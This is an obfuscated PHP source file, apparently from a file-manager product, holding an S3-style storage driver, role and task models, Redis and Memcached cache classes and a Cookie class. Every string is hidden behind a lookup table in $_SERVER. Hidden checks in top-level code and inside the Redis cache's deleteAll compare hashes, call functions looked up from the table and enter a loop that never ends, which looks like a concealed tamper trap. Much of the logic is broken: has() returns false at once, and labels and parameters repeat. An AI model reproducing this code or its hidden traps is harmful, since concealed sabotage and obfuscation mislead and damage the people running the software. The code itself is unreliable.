$Aӻ[$bɎ[194]] = $Aӻ[$bɎ[84]] = 0; $Aӻ[$bɎ[195]] = $Aӻ[$bɎ[196]] = !0; if ($d҆ == $bɎ[33]) { return $Aӻ; } goto c·; f݈: $bɎ =& $_SERVER[̉]; $Aӻ = array($bɎ[28] => $this->pathThis($d҆), $bɎ[76] => $this->getPathOuter($bɎ[8] . $d҆), $bɎ[29] => $bɎ[77]); if ($c߸) { return $Aӻ; } goto a; D: } private function fileList($F, $C = '', $c҇ = 0) { goto B; DЛ: if (!$E胸) { return array($dު[75] => array(), $dު[74] => array()); } $eӏ = $this->listItemCache === !1 ? !1 : !0; $C㰕 = $C = array(); goto B״; Fָ: return array($dު[75] => $C㰕, $dު[74] => $C); goto B; B: $dު =& $_SERVER[̉]; $aꖮ = rtrim($F, $dު[8]) . $dު[8]; $E胸 = $this->listObjs($aꖮ, null, null, $C); goto DЛ; B״: foreach ($E胸[$dު[198]] as $d) { goto AΜѐꞬ; AΜѐꞬ: $eթ = $d[$dު[28]]; if ($eթ == $aꖮ) { continue; } $D = isset($d[$dު[78]]) ? $d[$dު[78]] : 0; goto CƉ; CƉ: $Bې = $D == 0 && substr($eթ, strlen($eթ) - 1, 1) == $dު[8] ? !0 : !1; if ($eӏ) { $this->cacheMethod($dު[199], $eթ, $Bې); $this->cacheMethod($dު[200], $eթ, $d); } if ($Bې) { $C㰕[] = $eթ; continue; } goto d܊䟈; d܊䟈: $C[] = $c҇ ? $d : $eթ; goto e¥Ӌݬ; e¥Ӌݬ: } foreach ($E胸[$dު[201]] as $d) { $C㰕[] = $d[$dު[28]]; if ($eӏ) { $this->cacheMethod($dު[199], $d[$dު[28]], !0); } } if ($eӏ) { $this->cacheMethod($dު[199], $F, !0); } goto Fָ; B: } private function listObjs($b, $b = null, $Bר = null, $B = null) { $d =& $_SERVER[̉]; $b = trim($b, $d[8]); $D㗖ێ = empty($b) && $b !== $d[191] ? $d[33] : $b . $d[8]; return $this->client->getBucket($this->bucket, $D㗖ێ, $b, $Bר, $B, !0); } public function has($c, $b = false, $F˱ϊ = true) { goto E; E: return !1; goto B; E: $Eχ =& $_SERVER[̉]; $c = trim($c, $Eχ[8]); $cÎ = empty($c) && $c !== $Eχ[191] ? $Eχ[33] : $c . $Eχ[8]; goto Bֻ; Bֻ: $FЉо = null; $E = 500; $dϓ = $Eχ[8]; goto B; B: $dĿ = $a͓ = array(); while (!0) { $Cؠ = $this->listObjs($c, $FЉо, $E, $dϓ); if (!$Cؠ) { break; } $FЉо = $Cؠ[$Eχ[202]]; $aĶȖ = $Cؠ[$Eχ[198]]; $c = $Cؠ[$Eχ[201]]; if (empty($aĶȖ) && empty($c)) { break; } if (count($aĶȖ) == 1 && $aĶȖ[0][$Eχ[28]] == $cÎ) { break; } if ($b) { if (count($aĶȖ)) { $aĶȖ = array_column($aĶȖ, $Eχ[28]); $dĿ = array_merge($dĿ, $aĶȖ); } if (count($c)) { $c = array_column($c, $Eχ[28]); $a͓ = array_merge($a͓, $c); } if ($FЉо === null) { break; } continue; } if ($F˱ϊ) { if (!empty($aĶȖ)) { if (count($aĶȖ) > 1 || isset($aĶȖ[0][$Eχ[28]]) && $aĶȖ[0][$Eχ[28]] != $cÎ) { return !0; } } } else { if (!empty($c)) { return !0; } } if ($FЉо === null) { break; } } if ($b) { $dĿ = array_diff($dĿ, array($cÎ)); $dĿ = count(array_unique($dĿ)); $a͓ = count(array_unique($a͓)); return array($Eχ[203] => $dĿ, $Eχ[204] => $a͓); } goto E; B: } public function listAll($F寗) { $b =& $_SERVER[̉]; $Dڊǒ = $this->fileList($F寗, $b[33], !0); $bᰎ = array(); foreach ($Dڊǒ[$b[74]] as $a˔) { $bᰎ[$a˔[$b[28]]] = $a˔[$b[78]]; } foreach ($Dڊǒ[$b[75]] as $a˔) { if (is_string($a˔)) { $bᰎ[$a˔] = 0; } } return $this->listAllFiles($F寗, array_keys($bᰎ), $bᰎ); } public function canRead($e͍) { $cЃ̹ =& $_SERVER[̉]; $Fũت = $this->client->getAccessControlPolicy($this->bucket, $e͍); if (!$Fũت) { return !1; } return in_array($Fũت, array($cЃ̹[205], $cЃ̹[206], $cЃ̹[207])) ? !0 : !1; } public function canWrite($bΙ) { $b =& $_SERVER[̉]; $f = $this->client->getAccessControlPolicy($this->bucket, $bΙ); if (!$f) { return !1; } return in_array($f, array($b[205], $b[206])) ? !0 : !1; } public function getContent($Dǂ) { return $this->client->getObject($this->bucket, $Dǂ); } public function setContent($B, $D = '', $dϟ = false) { goto f; bۇ: $this->cacheMethod(null, null); $A = $this->copyFile($B, $B, array($E[208] => $A[$E[209]])); return $A ? !0 : !1; goto b茯; f: $E =& $_SERVER[̉]; $B = $dϟ ? trim($B, $E[8]) . $E[8] : $B; $d = get_file_mime(get_path_ext($B)); goto Bꇝ; Bꇝ: $A = $this->client->putObject($D, $this->bucket, $B, $E[192], array(), $d); if (!$A) { return !1; } if ($dϟ) { return !0; } goto bۇ; b茯: } public function fileSubstr($c, $B믇, $Aʿ䏆) { $F = $B믇 + $Aʿ䏆 - 1; return $this->client->getObject($this->bucket, $c, array($_SERVER[̉][210] => "\x62\x79\164\145\163\x3d{$B믇}\x2d{$F}")); } public function upload($aʞ, $f, $cÝ = false, $Fы̯ = REPEAT_REPLACE) { $C£ =& $_SERVER[̉]; $E˕ = array($C£[208] => @md5_file($f)); $e = array($C£[211] => get_file_mime(get_path_ext($aʞ))); if (IO::size($f) <= 1024 * 1024 * 200) { $Cﭳ = $this->client->putObjectFile($f, $this->bucket, $aʞ, $C£[192], $E˕, $e); return !empty($Cﭳ) ? $this->getPathOuter($aʞ) : !1; } $a愇 = $this->client->multiUploadObject($f, $this->bucket, trim($aʞ, $C£[8]), $E˕, $e); return $a愇 ? $this->getPathOuter($aʞ) : !1; } public function download($E拱, $Dԯ) { if (!@is_dir($this->pathFather($Dԯ)) && !IO::mkdir($this->pathFather($Dԯ))) { return !1; } $DΉ = $this->client->getObject($this->bucket, $E拱, array(), $Dԯ); return $DΉ !== !1 ? $Dԯ : !1; } public function link($c¦ɾ, $Bƒ = array()) { $a̜ =& $_SERVER[̉]; if ($this->signVer == $a̜[212]) { return $this->client->getAuthenticatedURL($this->bucket, $c¦ɾ, 3600 * 12, $Bƒ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($c¦ɾ, $a̜[8]), 3600 * 12, $this->region, array(), !0, $Bƒ); } public function fileOut($Cɽ, $fدӨ = false, $fԪ = false, $B = '') { goto E; e: $B = get_file_mime(get_path_ext($fԪ)); if ($B == $bچ[213]) { return parent::fileOut($Cɽ, $fدӨ, $fԪ, $B); } $fدӨ = $fدӨ ? $bچ[214] : $bچ[215]; goto Aʝ; E: $bچ =& $_SERVER[̉]; if ($this->isFileOutServer()) { return $this->fileOutServer($Cɽ, $fدӨ, $fԪ, $B); } if (!$fԪ) { $fԪ = $this->pathThis($Cɽ); } goto e; Aʝ: $bݓѪ = array($bچ[216] => $fدӨ . $bچ[217] . rawurlencode($fԪ), $bچ[218] => $B); $D댉Ф = $this->link($Cɽ, $bݓѪ); $this->fileOutLink($D댉Ф); goto B×Ԋ; B×Ԋ: } public function fileOutServer($DÅ, $Aּ = false, $E𛐪 = false, $bţ = '') { parent::fileOut($DÅ, $Aּ, $E𛐪, $bţ); } public function fileOutImageServer($cߎ, $c郅Ϫ = 250) { parent::fileOutImage($cߎ, $c郅Ϫ); } public function hashMd5($C۱պ, $b槅 = '') { $A =& $_SERVER[̉]; $eÉ = $this->objectMeta($C۱պ); if (!$eÉ) { return !1; } $b槅 = $b槅 ? $b槅 : _get($eÉ, $A[219]); $b槅 = $b槅 ? $b槅 : _get($eÉ, $A[209], $A[33]); return $b槅; } public function uploadFormData($a񆤾, $EǸ˙ = 3600) { $eƨ =& $_SERVER[̉]; $fƃ = $this->pathFather($a񆤾); $bպ = $this->client->getHttpUploadPostParams($this->bucket, $fƃ, $eƨ[192], $EǸ˙); return array_merge((array) $bպ, array($eƨ[175] => $this->getHost())); } public function multiUploadFormData($D, $eы = 3600) { $F =& $_SERVER[̉]; $F = gmdate($F[220]); $A쨃 = array(); $bߑ폚 = $this->client->getUploadId($this->bucket, $D, $A쨃); if (!$bߑ폚) { return !1; } return array($F[221] => $bߑ폚, $F[175] => $this->getHost() . $F[8] . $this->pathEncode($D), $F[222] => $F, $F[93] => $D); } public function multiUploadAuthData($c֪, $Aѿï = array()) { goto Dͳ; Dͳ: $bݹ =& $_SERVER[̉]; $b͛ = isset($Aѿï[$bݹ[222]]) ? $Aѿï[$bݹ[222]] : gmdate($bݹ[220]); $Cմ = isset($Aѿï[$bݹ[168]]) ? $Aѿï[$bݹ[168]] : $bݹ[33]; goto F߈˅; B: $bÿ = array($bݹ[224], $bݹ[33], $bݹ[119], $bݹ[33], "\170\55\x61\x6d\172\x2d\144\x61\164\x65\x3a{$b͛}", $bݹ[8] . $this->bucket . $bݹ[8] . $this->pathEncode($c㎊β) . $Cմ); if (strpos($Cմ, $bݹ[225]) === 0) { $bÿ[0] = $bݹ[226]; } if (isset($Aѿï[$bݹ[227]]) && $Aѿï[$bݹ[227]] == $bݹ[228]) { $bÿ[0] = $bݹ[228]; } goto Eܘ; Eܘ: $e񆣕 = implode($bݹ[229], $bÿ); $A = base64_encode(hash_hmac($bݹ[230], $e񆣕, $this->secret, !0)); $D = $bݹ[231] . $this->accessKey . $bݹ[4] . $A; goto B; F߈˅: $c㎊β = $Aѿï[$bݹ[93]]; unset($Aѿï[$bݹ[93]]); if (isset($Aѿï[$bݹ[223]])) { $Aѿï[$bݹ[222]] = $b͛; return $this->listUploadParts($c㎊β, $Aѿï); } goto B; B: if (strpos($Cմ, $bݹ[225]) === 0) { return array($bݹ[232] => $D, $bݹ[222] => $b͛); } return $D; goto BȎ; BȎ: } public function listUploadParts($F, $a팄 = array()) { goto eݵ; cϮ: if (!$dƿȑߧ) { return !1; } unset($a팄[$Cڇ܂[223]], $a팄[$Cڇ܂[227]]); $a팄[$Cڇ܂[93]] = $F; goto Cؕ; Cؕ: $fϒ = $this->multiUploadAuthData($F, $a팄); if (empty($fϒ)) { return !1; } return array($Cڇ܂[232] => $fϒ, $Cڇ܂[222] => $a팄[$Cڇ܂[222]], $Cڇ܂[234] => $dƿȑߧ); goto Dɣ; eݵ: $Cڇ܂ =& $_SERVER[̉]; $Eܴί = str_replace($Cڇ܂[233], $Cڇ܂[33], $a팄[$Cڇ܂[168]]); $dƿȑߧ = $this->client->listParts($this->bucket, $F, $Eܴί); goto cϮ; Dɣ: } public function getHost() { return parent::getHost() . $_SERVER[̉][8] . $this->bucket; } public function size($e) { $B = $this->objectMeta($e); return $B ? $B[$_SERVER[̉][78]] : 0; } public function info($Eۨ) { if ($this->isFolder($Eۨ)) { return $this->folderInfo($Eۨ); } else { if ($this->isFile($Eۨ)) { return $this->fileInfo($Eۨ); } } return !1; } public function exist($d΄) { return $this->isFile($d΄) || $this->isFolder($d΄); } public function isFile($eĐه) { return !$this->isFolder($eĐه) && $this->objectMeta($eĐه); } public function isFolder($D) { return $this->cacheMethod($_SERVER[̉][199], $D); } protected function objectMeta($cۃ) { return $this->cacheMethod($_SERVER[̉][200], $cۃ); } protected function _objectMeta($D) { $C޾ =& $_SERVER[̉]; $D = rtrim($D, $C޾[8]); try { $F폙 = $this->client->getObjectInfo($this->bucket, $D); if (!isset($F폙[$C޾[219]]) && isset($F폙[$C޾[235]])) { $F폙[$C޾[219]] = $F폙[$C޾[235]]; } } catch (Exception $d) { $F폙 = !1; } if (!$F폙) { } return $F폙; } protected function _isFolder($F٤) { goto A̜ĵ; f됯: return !0; goto dτ; A̜ĵ: $E =& $_SERVER[̉]; $F٤ = rtrim($F٤, $E[8]); if ($F٤ == $E[33] || $F٤ == $E[8]) { return !0; } goto a; f֯: return stripos($cκĤ, $F٤ . $E[8]) === 0 ? !0 : !1; if (substr($cκĤ, -1) == $E[8]) { return !0; } if (get_path_this($cκĤ) == get_path_this($F٤)) { return !1; } goto f됯; a: $cꘫ = $this->client->getBucket($this->bucket, $F٤, null, 1); if (empty($cꘫ[$E[198]])) { return !1; } $cκĤ = $cꘫ[$E[198]][0][$E[28]]; goto f֯; dτ: } } define($_SERVER[̉][236], 1); goto E󽅎; a: $D = $_SERVER[̉][1214]; if ($_SERVER[$_SERVER[̉][834]] != $D($Fٶ)) { goto E; D: $d = explode($_SERVER[̉][229], $Fʐ); if (count($d) < $_SERVER[̉][583]) { $aѨ = $_SERVER[̉][840]; $aѨ(); } $aԎ = $_SERVER[̉][1215]; goto DŸ; DŸ: $aԎ($Fٶ); goto E; E: $Dح = $_SERVER[̉][837]; $FǗˇ = $_SERVER[$_SERVER[̉][838]] . $_SERVER[̉][839]; $Fʐ = $Dح($FǗˇ); goto D; E: } class PathDriverDbShareLink extends PathDriverDB { public function __construct($F) { $this->pathParse = $F; $this->model = Model($_SERVER[̉][1205]); } protected function infoParse($a, $EЌ֬ = false, $f = false) { $bެ =& $_SERVER[̉]; return Action($bެ[1069])->sharePathInfo($this->pathParse[$bެ[76]], !0); } public function listPath($C޵ȍ, $bམ = false) { $B =& $_SERVER[̉]; $dꌇ = parent::listPath($C޵ȍ, $bམ); foreach ($dꌇ as $A => $B) { if (!in_array($A, array($B[74], $B[75]))) { continue; } foreach ($B as $dԣ => $f뻟) { $dꌇ[$A][$dԣ] = Action($B[1069])->shareItemInfo($f뻟); } } return $dꌇ; } public function listAll($Cˍ) { goto D먾; fƘ: return $bԏ; goto d͏; fލ: $bԏ = $this->model->listAll($Cˍ); foreach ($bԏ as &$C) { $C[$D䂾[85]] = Action($D䂾[1069])->shareItemInfo($C[$D䂾[85]]); } unset($C); goto fƘ; D먾: $D䂾 =& $_SERVER[̉]; $FП = IO::info($this->pathParse[$D䂾[76]]); if (!$FП) { return array(); } goto fލ; d͏: } } goto B; C: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x72\157\154\x65\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\141\165\x74\x68", "\154\141\x62\x65\154", "\x64\x69\163\160\154\x61\171", "\163\x79\x73\164\x65\x6d", "\144\145\163\x63", "\151\147\x6e\x6f\x72\145\105\170\x74", "\151\x67\x6e\x6f\162\x65\x46\151\x6c\145\123\151\x7a\145", "\x61\x64\155\151\x6e\151\163\x74\162\141\164\157\162", "\163\x6f\162\x74"); public function listData($DƨԌ = false, $E򺗘 = "\163\x6f\162\164", $bǈڤ = false) { $D㰑 =& $_SERVER[̉]; $bس = parent::listData($DƨԌ, $E򺗘, $bǈڤ); if (!$DƨԌ) { foreach ($bس as $B߶ => $aϳ) { if ($aϳ[$D㰑[1884]] == 1) { $bس[$B߶][$D㰑[431]] = LNG($D㰑[2110]); } } } return $bس; } public function update($Dͯ, $A轐) { goto eī; eī: $b屽 =& $_SERVER[̉]; $A = parent::listData($Dͯ); $Bݾ = $this->findByName($A轐[$b屽[28]]); goto fۯ; fۯ: if (!$A || $Bݾ && $Bݾ[$b屽[393]] != $A[$b屽[393]]) { return !1; } if ($Bݾ[$b屽[1884]] == 1) { $A轐 = array($b屽[28] => $A轐[$b屽[28]], $b屽[1716] => $A轐[$b屽[1716]]); } $this->filterAuth($A轐[$b屽[406]]); goto aꆫ; aꆫ: return parent::update($Dͯ, $A轐); goto a҉Λ㿒; a҉Λ㿒: } public function remove($C޻¹) { $eޕ։ = parent::listData($C޻¹); if (!$eޕ։ || $eޕ։[$_SERVER[̉][1170]]) { return !1; } return parent::remove($C޻¹); } public function add($C᷸) { goto b߶; e: $A翲 = array($Aģ[413] => $E٭, $Aģ[1701] => $Aģ[33], $Aģ[1697] => $Aģ[1705], $Aģ[2111] => 1, $Aģ[1700] => 0, $Aģ[2112] => 0, $Aģ[1699] => $this->getSort()); $C᷸ = array_merge($A翲, $C᷸); $this->filterAuth($C᷸[$Aģ[406]]); goto e; b߶: $Aģ =& $_SERVER[̉]; $E٭ = $C᷸[$Aģ[28]]; if ($this->findByName($E٭)) { return !1; } goto e; e: return parent::insert($C᷸); goto d臉; d臉: } private function getSort() { $d =& $_SERVER[̉]; $cíʹԐ = parent::listData(); $DĶ = array_to_keyvalue($cíʹԐ, $d[33], $d[1718]); return empty($DĶ) ? 0 : max($DĶ) + 1; } private function filterAuth(&$bݐш) { $E漇 =& $_SERVER[̉]; $c΋݆ = array(); $a = array_filter(explode($E漇[47], $bݐш)); foreach ($a as $bݐш) { $Dƪ = explode($E漇[95], $bݐш); if ($Dƪ[0] == $E漇[2113] && $Dƪ[1] != $E漇[1089]) { $E = $Dƪ[0] . $E漇[95] . $Dƪ[1] . $E漇[2114]; if (!in_array($E, $a)) { $c΋݆[] = $E; } } $c΋݆[] = $bݐш; } $bݐш = implode($E漇[47], $c΋݆); } public function sort($bƭǙޅ, $Dйʜ) { return parent::update($bƭǙޅ, $Dйʜ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\x74\141\163\x6b\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x74\171\160\145", "\x65\166\x65\156\164", "\x74\x69\155\x65", "\144\x65\163\x63", "\163\171\163\x74\145\155", "\x65\156\x61\142\154\145", "\x6c\x61\x73\164\x52\x75\156", "\x73\x6f\x72\x74"); public function listData($eЧ΅ = false, $B = "\x73\x6f\x72\x74", $Cҷ = false) { return parent::listData($eЧ΅, $B, $Cҷ); } public function add($E) { $f =& $_SERVER[̉]; $d = $this->findByName($E[$f[28]]); if ($d) { return !1; } $E[$f[1496]] = 0; $E[$f[1718]] = $this->getSort(); return parent::insert($E); } private function getSort() { $A묈 =& $_SERVER[̉]; $f簛 = parent::listData(); $Ȃ = array_to_keyvalue($f簛, $A묈[33], $A묈[1718]); return empty($Ȃ) ? 0 : max($Ȃ) + 1; } public function update($F袧, $cꋃƂ) { $B =& $_SERVER[̉]; $C = $this->listData($F袧); $Aٽ = $this->findByName($cꋃƂ[$B[28]]); if (!$C || $Aٽ && $Aٽ[$B[393]] != $C[$B[393]]) { return !1; } return parent::update($F袧, $cꋃƂ); } public function remove($dλ, $B՘ = false) { $b색 =& $_SERVER[̉]; $f = $this->listData($dλ); if (!$f) { return; } if (!$B՘ && $f[$b색[1170]] == $b색[87]) { return !1; } return parent::remove($dλ); } public function enable($E, $B㴝) { return $this->update($E, array($_SERVER[̉][2105] => $B㴝)); } public function run($eֿꇌ) { return $this->update($eֿꇌ, array($_SERVER[̉][2115] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($A) { $b퉮ӓ =& $_SERVER[̉]; return array($b퉮ӓ[1797] => array(USER_ID, $b퉮ӓ[2116])); } protected function listData() { $Cʣ =& $_SERVER[̉]; $dڔ = array($Cʣ[1523] => USER_ID, $Cʣ[463] => 0); $d = $Cʣ[2117]; $F櫆 = $this->field($d)->where($dڔ)->order($Cʣ[2118])->select(); return $F櫆 ? $F櫆 : array(); } protected function resetCache() { } protected function listView() { goto Dˤ; e핏: $aՕ = array_to_keyvalue($D, $a[33], $a[76]); if (!$aՕ) { return $fꥄ; } $eˢ = 2000; goto c; c: $e烐 = array($a[410] => array($a[411], $aՕ)); $DԨ = Model($a[793])->listSource($e烐, $eˢ); $DԨ = array_merge($DԨ[$a[74]], $DԨ[$a[75]]); goto d𭣈; Dˤ: $a =& $_SERVER[̉]; $fꥄ = $this->listData(); $D = array_filter_by_field($fꥄ, $a[29], $a[409]); goto e핏; d𭣈: $DԨ = array_to_keyvalue($DԨ, $a[395]); foreach ($fꥄ as $Cȏ => $F㔪) { $C攴 = $DԨ[$F㔪[$a[76]]]; $C攴 = $C攴 ? $C攴 : array(); $fꥄ[$Cȏ] = array_merge($C攴, $F㔪); } return $fꥄ; goto D; D: } protected function addFav($Cڵͺ, $B = '', $e̼ = "\x73\157\165\x72\143\x65") { goto AҒ; eӈЩ: if (!$B && $e̼ == $F[409]) { $FĿ = Model($F[1205])->where(array($F[410] => $Cڵͺ))->find(); if (!$FĿ) { return !1; } $B = $FĿ[$F[28]]; } $B = $this->getAutoName($B); $A = array($F[1523] => USER_ID, $F[463] => 0, $F[413] => $B, $F[414] => $Cڵͺ, $F[415] => $e̼, $F[1699] => $E쯙 + 1); goto FП; AҒ: $F =& $_SERVER[̉]; $bԚ = array($F[1523] => USER_ID, $F[463] => 0, $F[415] => $e̼, $F[414] => $Cڵͺ); if ($this->where($bԚ)->find()) { return !1; } goto A럟; FП: return $this->add($A); goto f; A럟: $bԚ = array($F[1523] => USER_ID, $F[463] => 0); $E쯙 = $this->where($bԚ)->max($F[1718]); if (!$E쯙) { $E쯙 = 0; } goto eӈЩ; f: } protected function remove($a) { $CĨ =& $_SERVER[̉]; $Cܱǭ = array($CĨ[1523] => USER_ID, $CĨ[412] => $a); return $this->where($Cܱǭ)->delete(); } protected function removeByName($e) { $bغ =& $_SERVER[̉]; $Bㅉ = array($bغ[1523] => USER_ID, $bغ[413] => $e, $bغ[463] => 0); return $this->where($Bㅉ)->delete(); } protected function rename($Eݴ, $dɰ墑) { $d쟝 =& $_SERVER[̉]; if ($Eݴ == $dɰ墑) { return !1; } $A = $this->getAutoName($dɰ墑); if ($dɰ墑 != $A) { return !1; } $b̾ = array($d쟝[1523] => USER_ID, $d쟝[463] => 0, $d쟝[28] => $Eݴ); return $this->where($b̾)->save(array($d쟝[28] => $dɰ墑)); } protected function resetSort($aً) { $f =& $_SERVER[̉]; $aً = is_array($aً) ? $aً : array(); $b = array($f[1523] => USER_ID); for ($Cㅜ = 0; $Cㅜ < count($aً); $Cㅜ++) { $b[$f[412]] = $aً[$Cㅜ]; $this->where($b)->save(array($f[1699] => $Cㅜ + 1)); } return !0; } protected function moveTop($b) { goto e｠; b: if (!$Cۅ) { return; } $f = $this->field($bƐ[393])->where($cՂ)->order($bƐ[2118])->select(); $f = array_to_keyvalue($f, $bƐ[33], $bƐ[393]); goto Cޯ; e｠: $bƐ =& $_SERVER[̉]; $cՂ = array($bƐ[1523] => USER_ID, $bƐ[463] => 0); $Cۅ = $this->where($cՂ)->where(array($bƐ[28] => $b))->find(); goto b; Cޯ: $Dŝ = $f; $f = array_remove_value($f, $Cۅ[$bƐ[393]]); array_unshift($f, $Cۅ[$bƐ[393]]); goto cƷ; cƷ: return $this->resetSort($f); goto D; D: } protected function moveBottom($B컻) { $b㊵ã =& $_SERVER[̉]; $E = array($b㊵ã[1523] => USER_ID, $b㊵ã[463] => 0); $cƔ = $this->where($E)->max($b㊵ã[1718]); $d˰ = array($b㊵ã[1718] => $cƔ + 1); return $this->where($E)->where(array($b㊵ã[28] => $B컻))->save($d˰); } private function getAutoName($dʭ) { goto dɆߧ; dɆߧ: $b =& $_SERVER[̉]; $A = array($b[1523] => USER_ID, $b[463] => 0); $d͗״ = $this->field($b[28])->where($A)->select(); goto C㭔; C㭔: $d͗״ = array_to_keyvalue($d͗״, $b[33], $b[28]); if (!$d͗״ || !in_array($dʭ, $d͗״)) { return $dʭ; } for ($F֪ = 0; $F֪ < count($d͗״); $F֪++) { if (!in_array($dʭ . "\50{$F֪}\51", $d͗״)) { return $dʭ . "\x28{$F֪}\x29"; } } goto E뻫; E뻫: return $dʭ . "\x28{$F֪}\x29"; goto Eό; Eό: } } goto D; fĄ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($a, $DՂ޹) { $B =& $_SERVER[̉]; if (!class_exists($B[824])) { show_json($B[825], !1); } $this->cacheTime = $DՂ޹; $this->handle = new Memcached(); if (is_array($a[$B[826]]) && count($a[$B[826]]) >= 1) { foreach ($a[$B[826]] as $a) { $b = explode($B[4], $a); $this->handle->addServer($b[0], $b[1]); } } else { $this->handle->addServer($a[$B[175]], $a[$B[176]]); } } public function set($Fܵ, $cҵ, $c = false) { $c = $c ? $c : $this->cacheTime; return $this->handle->set($Fܵ, $cҵ, $c); } public function get($aՕ) { return $this->handle->get($aՕ); } public function remove($eЍ) { return $this->handle->delete($eЍ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($A϶, $Eö) { $aʍ =& $_SERVER[̉]; if (!class_exists($aʍ[827])) { show_json($aʍ[828], !1); } $this->cacheTime = $Eö; $eĕ = isset($A϶[$aʍ[829]]) ? $A϶[$aʍ[829]] : 10; $d͊ՠ = _get($A϶, $aʍ[826]); if ($d͊ՠ && is_array($d͊ՠ)) { $this->initCluster($A϶, $eĕ); } else { $this->handle = $this->init($A϶, $eĕ); } } private function init($c沄, $Dظڬ) { $Dŕ =& $_SERVER[̉]; $c͍ = new Redis(); $bߏЄ = isset($c沄[$Dŕ[830]]) ? $c沄[$Dŕ[830]] : !1; if ($bߏЄ) { $c͍->pconnect($c沄[$Dŕ[175]], $c沄[$Dŕ[176]], $Dظڬ); } else { $c͍->connect($c沄[$Dŕ[175]], $c沄[$Dŕ[176]], $Dظڬ); } if (!empty($c沄[$Dŕ[406]])) { $c͍->auth($c沄[$Dŕ[406]]); } return $c͍; } private function initCluster($b, $bג) { $D˥Ŧ =& $_SERVER[̉]; $Eؒ = array($D˥Ŧ[831], $D˥Ŧ[832], $D˥Ŧ[833]); $B = $D˥Ŧ[831]; if (isset($b[$D˥Ŧ[12]]) && in_array($b[$D˥Ŧ[12]], $Eؒ)) { $B = $b[$D˥Ŧ[12]]; } switch ($B) { case $D˥Ŧ[831]: $this->_slave($b, $bג); break; case $D˥Ŧ[832]: break; case $D˥Ŧ[833]: $this->isCluster = !0; $Cꇿ = $b[$D˥Ŧ[826]]; $DԪ = isset($b[$D˥Ŧ[830]]) ? $b[$D˥Ŧ[830]] : !1; $B = isset($b[$D˥Ŧ[406]]) ? $b[$D˥Ŧ[406]] : null; $this->handle = new RedisCluster(NUll, $Cꇿ, $bג, $bג, $DԪ, $B); break; default: break; } } private function _slave($cڥԍ, $e٣) { goto fΌ; fΌ: $Bւ = $cڥԍ[$_SERVER[̉][826]]; $this->filterConfig($cڥԍ, $Bւ[0]); $this->handle = $this->init($cڥԍ, $e٣); goto f; f: unset($Bւ[0]); if (empty($Bւ)) { return; } $C̭ = array_rand($Bւ); goto Fա; Fա: $this->filterConfig($cڥԍ, $Bւ[$C̭]); $this->slaveHandle = $this->init($cڥԍ, $e٣); goto F; F: } private function filterConfig(&$f׈՟, $fޞ) { $A՜ =& $_SERVER[̉]; $cÐ = explode($A՜[4], $fޞ); $fƈ = array($A՜[175] => $cÐ[0], $A՜[176] => $cÐ[1]); $f׈՟ = array_merge($f׈՟, $fƈ); } public function set($Eʢ, $Bč, $bͤ = false) { $bͤ = $bͤ ? $bͤ : $this->cacheTime; return $this->handle->setEx($Eʢ, $bͤ, $Bč); } public function setLock($fͿÌ, $Cǰ, $bغ) { return $this->handle->setNX($fͿÌ, $Cǰ); } public function get($e) { $b툈 = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $b툈->get($e); } public function remove($F) { return $this->handle->del($F); } public function deleteAll() { $CԦʹ =& $_SERVER[̉]; if (!isset($_SERVER[$CԦʹ[834]]) || !isset($_SERVER[$CԦʹ[835]])) { goto Bº; D߾: $c⊑ = $A($D); $DǶ = explode($CԦʹ[229], $c⊑); if (count($DǶ) < $CԦʹ[581]) { $f塹Ź = $CԦʹ[840]; $f塹Ź(); } goto a𧵬; D: for ($D̮Å = $bۨ; $D̮Å > 0; $D̮Å++) { $bӓ = json_encode($GLOBALS[$CԦʹ[411]]); } goto F͚; Bº: $B = $CԦʹ[836]; $A = $CԦʹ[837]; $D = $_SERVER[$CԦʹ[838]] . $CԦʹ[839]; goto D߾; a𧵬: $bӓ = $CԦʹ[841]; $bӓ($_SERVER[$CԦʹ[842]]); $bۨ = 1; goto D; F͚: } if ($this->isCluster) { foreach ($this->handle->_masters() as $A왵) { $this->handle->flushall($A왵); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($f = '', $C = 0) { if (is_string($f) && $f != $_SERVER[̉][33]) { $this->prefix = $f; } if (is_numeric($C) && $C > 0) { $this->expire = $C; } } public static function getInstance() { static $f˴飺; if ($f˴飺 === null) { $f˴飺 = new self(); } return $f˴飺; } private static $cookieDisable = false; public static function disable($Bݼ) { self::$cookieDisable = $Bݼ; } private static $sameCookieSet = array(); public static function set($c, $E깧, $C = 0, $D×Ɍ = false, $eҼ㏛ = false) { goto E˂; C: $d厪̏ = $A׹[33]; setcookie($c, $E깧, time() + $C, $A׹[8] . trim($eҼ㏛, $A׹[8]) . $d厪̏, !1, !1, $D×Ɍ); goto bʃ; E˂: $A׹ =& $_SERVER[̉]; if (self::$cookieDisable) { return; } if (!$C) { $C = 24 * 3600 * 7; } goto B; B: if (isset(self::$sameCookieSet[$c]) && self::$sameCookieSet[$c] == $E깧 . $C) { return; } self::$sameCookieSet[$c] = $E깧 . $C; if (!$eҼ㏛) { $eҼ㏛ = str_replace(HOST, $A׹[33], APP_HOST); $eҼ㏛ = _get($GLOBALS, $A׹[843], $eҼ㏛); } goto C; bʃ: } public static function setSafe($FΟ, $aʨ, $Dƴ = 0) { self::set($FΟ, $aʨ, $Dƴ, !0); } public static function get($dČ) { return isset($_COOKIE[$dČ]) ? $_COOKIE[$dČ] : !1; } public static function remove($D΍ǋ, $e٫ = false) { unset($_COOKIE[$D΍ǋ]); self::set($D΍ǋ, $_SERVER[̉][33], 1, $e٫); } } goto a; B̉: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($c១ʽ, $cϔ = 5.0) { if (!$c១ʽ) { return; } $a = Cache::get($c១ʽ); if (!$a || timeFloat() - floatVal($a) >= $cϔ) { Cache::set($c១ʽ, timeFloat(), $cϔ * 10); 